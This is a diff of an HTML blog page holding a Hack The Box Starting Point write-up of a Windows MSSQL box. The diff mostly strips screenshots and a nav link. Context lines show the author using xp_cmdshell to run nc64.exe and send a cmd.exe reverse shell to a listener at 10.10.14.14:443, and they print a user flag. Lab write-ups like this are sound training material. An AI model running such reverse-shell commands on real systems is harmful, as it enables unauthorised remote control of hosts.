@@ -83,12 +83,6 @@ This was the first box in Tier 2 of the Starting Point. However, I am pretty sur
     >Blog</a
   >
 
-  <a
-    href="/photos/"
-    
-    >Photos</a
-  >
-
 
   <a href="/index.xml">
     <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
@@ -204,7 +198,6 @@ This was the first box in Tier 2 of the Starting Point. However, I am pretty sur
 
 
 <pre tabindex="0"><code>xp_cmdshell</code></pre>
-<p><img src="image-4.png#center" alt="alt text"></p>
 <br>
 <h4 id="what-script-can-be-used-in-order-to-search-possible-paths-to-escalate-privileges-on-windows-hosts">What script can be used in order to search possible paths to escalate privileges on Windows hosts?</h4>
 
@@ -255,7 +248,6 @@ This was the first box in Tier 2 of the Starting Point. However, I am pretty sur
 <p><img src="image-6.png#center" alt="alt text"></p>
 <p>it was confirmed that the target machine indeed performed the request. Let&rsquo;s bind the <code>cmd.exe</code> through the <code>nc</code> to our listener.</p>
 <p><code>SQL&gt; xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.14 443&quot;</code></p>
-<p><img src="image-7.png#center" alt="alt text"></p>
 <p>on the right tmux pane, I was able to capture the reverse shell through the netcat.</p>
 <br>
 <h4 id="what-file-contains-the-administrators-password">What file contains the administrator&rsquo;s password?</h4>
@@ -284,8 +276,7 @@ This was the first box in Tier 2 of the Starting Point. However, I am pretty sur
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb">type</span> user.txt
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>3e7b102e78218e935bf3f4951fec21a3
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\s</span>ql_svc<span style="color:#89b4fa">\D</span>esktop&gt;</span></span></code></pre></div>
-<p>On the target machine, I used powershell to download the program from my system.
-<img src="image-8.png#center" alt="alt text"></p>
+<p>On the target machine, I used powershell to download the program from my system.</p>
 <p><img src="image-9.png#center" alt="alt text"></p>
 <br>
 <h4 id="submit-user-flag">Submit user flag</h4>
